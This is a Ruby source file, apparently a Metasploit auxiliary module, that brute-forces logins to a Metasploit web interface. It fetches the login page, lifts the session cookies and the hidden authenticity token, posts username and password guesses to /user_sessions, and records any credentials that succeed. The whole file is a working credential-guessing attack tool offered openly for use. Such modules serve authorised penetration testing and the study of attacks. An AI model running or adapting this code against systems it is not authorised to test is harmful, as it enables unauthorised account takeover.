##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class Metasploit3 < Msf::Auxiliary

  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::Report
  include Msf::Auxiliary::AuthBrute

  include Msf::Auxiliary::Scanner

  def initialize
    super(
      'Name'           => 'Metasploit Web interface Login Utility',
      'Description'    => %{
        This module simply attempts to login to a Metasploit
        web interface using a specific user/pass.
      },
      'Author'         => [ 'Vlatko Kosturjak <kost[at]linux.hr>' ],
      'License'        => MSF_LICENSE
    )

    register_options(
      [
        Opt::RPORT(3790),
        OptString.new('URILOGIN', [true, "URI for Metasploit Web login. Default is /login", "/login"]),
        OptString.new('URIGUESS', [true, "URI for Metasploit Web login. Default is /user_sessions", "/user_sessions"]),
        OptBool.new('BLANK_PASSWORDS', [false, "Try blank passwords for all users", false]),
        OptBool.new('SSL', [ true, "Negotiate SSL for outgoing connections", true])
      ], self.class)

    register_autofilter_ports([55553])
  end

  def run_host(ip)
    begin
      res = send_request_cgi({
        'uri'     => datastore['URILOGIN'],
        'method'  => 'GET'
        }, 25)
      http_fingerprint({ :response => res })
    rescue ::Rex::ConnectionError => e
      vprint_error("#{datastore['URILOGIN']} - #{e}")
      return
    end

    if not res
      vprint_error(" #{datastore['URILOGIN']} - No response")
      return
    end
    if !(res.code == 200 or res.code == 302)
      vprint_error("Expected 200 HTTP code - not msf web? Got: #{res.code}")
      return
    end
    if res.body !~ /<title>Metasploit<\/title>/
      vprint_error("Expected metasploit page - not msf web interface? #{res.body}")
      return
    end

    each_user_pass do |user, pass|
      do_login(user, pass)
    end
  end

  def do_login(user='msf', pass='msf')
    vprint_status(" - Trying username:'#{user}' with password:'#{pass}'")
    begin
      res = send_request_cgi({
        'uri'     => datastore['URILOGIN'],
        'method'  => 'GET'
        }, 25)

      token = ''
      uisession = ''
      if res and res.code == 200 and res.headers['Set-Cookie']
        # extract tokens from cookie
        res.headers['Set-Cookie'].split(';').each {|c|
          c.split(',').each {|v|
            if v.split('=')[0] =~ /token/
              token = v.split('=')[1]
            elsif v.split('=')[0] =~ /_ui_session/
              uisession = v.split('=')[1]
            end
          }
        }
        # extract authenticity_token from hidden field
        atoken = res.body.scan(/<input name="authenticity_token" type="hidden" value="(.*)"/).flatten[0]

        if atoken.nil?
          print_error("No auth token found")
          return :abort
        end
      else
        print_error("Failed to get login cookies, aborting")
        return :abort
      end

      res = send_request_cgi(
      {
        'uri'       => datastore['URIGUESS'],
        'method'    => 'POST',
        'cookie'    => "token=#{token}; _ui_session=#{uisession}",
        'vars_post' =>
          {
            'commit' => 'Sign in',
            'utf8' => "\xE2\x9C\x93",
            'authenticity_token' => atoken,
            'user_session[username]' => user,
            'user_session[password]' => pass
          }
      }, 25)

      if not res or res.code != 302
        vprint_error("FAILED LOGIN. '#{user}' : '#{pass}' with code #{res.code}")
        return :skip_pass
      end
      if res.headers['Location'] =~ /\/login/
        vprint_error("FAILED LOGIN. '#{user}' : '#{pass}' with wrong redirect")
        return :skip_pass
      else
        print_good("SUCCESSFUL LOGIN. '#{user}' : '#{pass}'")

        report_hash = {
          :host   => datastore['RHOST'],
          :port   => datastore['RPORT'],
          :sname  => 'msf-web',
          :user   => user,
          :pass   => pass,
          :active => true,
          :type => 'password'}

        report_auth_info(report_hash)
        return :next_user
      end
    rescue ::Rex::ConnectionError, Errno::ECONNREFUSED, Errno::ETIMEDOUT
      print_error("HTTP Connection Failed, Aborting")
      return :abort
    end
  end
end
